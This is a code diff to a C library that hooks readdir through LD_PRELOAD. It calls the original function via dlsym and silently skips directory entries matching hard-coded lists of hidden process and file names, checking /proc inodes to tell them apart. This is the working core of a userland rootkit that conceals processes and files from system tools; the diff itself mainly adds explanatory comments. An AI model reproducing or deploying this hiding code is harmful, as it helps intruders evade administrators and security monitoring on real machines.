@@ -26,12 +26,15 @@ bool is_hidden(char *hidden[], size_t n_hidden, char *name);
 bool is_numeric(char *text);
 bool check_inode(ino_t inode, char *filepath);
 
+// intercepting readdir-function
 struct dirent *readdir(DIR *dirp) {
+  // get reference to the original readdir-function
   if (orig_readdir == NULL) {
     orig_readdir = dlsym(RTLD_NEXT, "readdir\0");
     DEBUG_LOG_ERR("[LD_PRELOAD] Successfully preloaded! %p\n", orig_readdir);
   }
 
+  // call the original readdir-function
   struct dirent *tmp;
   tmp = orig_readdir(dirp);
 
@@ -40,9 +43,12 @@ struct dirent *readdir(DIR *dirp) {
     return tmp;
   }
 
+  // if there are no errors, check the result of the original readdir and decide if the result should be skipped
+
   char *filename = tmp->d_name;
+
+  // check if file is a process to be hidden
   char process_name[256];
-  // DEBUG_LOG_ERR("[LD_PRELOAD] Filename: %s\tInode: %d\n", filename, tmp->d_ino);
   if (is_numeric(filename) && get_name(process_name, filename)) {
     // DEBUG_LOG_ERR("[LD_PRELOAD] Name: %s \n", process_name);
     if (is_hidden(HIDDEN_PROCS, HIDDEN_PROCS_COUNT, process_name) &&
@@ -51,6 +57,7 @@ struct dirent *readdir(DIR *dirp) {
       tmp = readdir(dirp);
     }
   } else if (is_hidden(HIDDEN_FILES, HIDDEN_FILES_COUNT, filename)) {
+    // check if file is a file to be hidden
     DEBUG_LOG_ERR("[LD_PRELOAD] Skipping File: %s\n", process_name);
     tmp = readdir(dirp);
   }
@@ -110,12 +117,13 @@ bool is_numeric(char *text) {
   return true;
 }
 
+// compare the inode of the current entry with the inode of the file in /proc directory (avoid hiding files that are not a process by mistake)
 bool check_inode(ino_t inode, char *filepath) {
   // DEBUG_LOG_ERR("Comparing Inodes: %d <-> %s\n", inode, filepath);
   int fd;
   char *path;
   if (is_numeric(filepath)) {
-    path = malloc(strlen(filepath) + 7); // '/proc/\x00'
+    path = malloc(strlen(filepath) + 7); // +7 for '/proc/\x00'
     sprintf(path, "/proc/%s", filepath);
   } else {
     path = malloc(strlen(filepath) + 1);
